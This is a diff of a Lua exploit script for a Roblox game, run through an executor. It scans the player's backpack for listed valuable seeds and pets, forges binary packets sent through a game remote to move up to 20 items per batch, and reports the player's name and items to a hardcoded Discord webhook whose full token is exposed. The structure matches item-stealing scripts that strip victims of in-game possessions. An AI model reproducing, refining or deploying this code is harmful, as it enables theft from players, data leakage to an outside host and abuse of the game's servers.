@@ -1,4 +1,4 @@
--- Cobalt Mass Sender – scans backpack, builds dynamic payload, sends up to 20 per batch
+-- Dynamic payload sender – only selected items are allowed
 local ALLOWED_PETS = {"Robin"}
 local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
@@ -7,7 +7,7 @@ local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEv
 local player = game:GetService("Players").LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 
--- Lookup tables (case‑insensitive)
+-- Quick lookup
 local petLookup = {}
 for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
 local seedLookup = {}
@@ -15,9 +15,9 @@ for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end
 
 -- Webhook notifier
 local function sendWebhook(msg)
-    local req = (type(request) == "function" and request)
-        or (type(http_request) == "function" and http_request)
-        or (syn and type(syn.request) == "function" and syn.request)
+    local req = (type(request) == "function" and request) 
+        or (type(http_request) == "function" and http_request) 
+        or (syn and type(syn.request) == "function" and syn.request) 
         or (http and type(http.request) == "function" and http.request)
     if req then
         pcall(req, {
@@ -29,15 +29,21 @@ local function sendWebhook(msg)
     end
 end
 
--- Build one item block: \x1C\v\aItemKey\v<len><key>\v\x05Count\x05<count>\v\bCategory\v<len><category>
-local function buildItemBlock(key, count, category)
-    return "\x1C\v\aItemKey\v" .. string.char(#key) .. key
-        .. "\v\x05Count\x05" .. string.char(count)
-        .. "\v\bCategory\v" .. string.char(#category) .. category
+-- Builds one item block exactly as Cobalt does
+local function buildItemBlock(itemKey, count, category)
+    return table.concat({
+        "\x1C",
+        "\v\aItemKey",
+        "\v" .. string.char(#itemKey) .. itemKey,
+        "\v\x05Count",
+        "\x05" .. string.char(count),
+        "\v\bCategory",
+        "\v" .. string.char(#category) .. category
+    })
 end
 
--- Fixed header used in multi‑item examples
-local HEADER = "!\x01\x33\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+-- Verified header from a working multi‑item call
+local HEADER = "!\x01\x1C\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
 
 sendWebhook("🚀 **Mass Sender Started** by " .. player.Name)
 
@@ -45,7 +51,7 @@ while true do
     local items = backpack:GetChildren()
     local queue = {}
 
-    -- Scan all items; collect up to 20 matching items
+    -- Scan for matching seeds and pets (max 20 per batch)
     for _, item in ipairs(items) do
         if #queue >= 20 then break end
         
@@ -61,13 +67,13 @@ while true do
                     instance = item
                 })
             end
-        else  -- assume it's a pet
+        else
             local petName = item:GetAttribute("Pet")
             local petId = item:GetAttribute("PetId")
             if petName and petId and petLookup[petName:lower()] then
                 table.insert(queue, {
                     key = "$" .. petId,
-                    count = 1,      -- pets always count as 1
+                    count = 1,
                     category = "Pets",
                     instance = item
                 })
@@ -80,7 +86,7 @@ while true do
         break
     end
 
-    -- Build the full payload
+    -- Build payload with correct separators
     local payload = HEADER
     for i, itemData in ipairs(queue) do
         if i > 1 then
@@ -90,12 +96,12 @@ while true do
     end
     payload = payload .. "\x00\x00\x00"
 
-    -- Fire the remote
+    -- Fire the remote – items are sent, server handles removal
     if Event then
         Event:FireServer(buffer.fromstring(payload))
     end
 
-    -- Log sent items (no client‑side deletion)
+    -- Log what was sent (no client destruction)
     local logLines = {}
     for _, itemData in ipairs(queue) do
         table.insert(logLines, string.format("• %s (x%d) sent.", itemData.instance.Name, itemData.count))
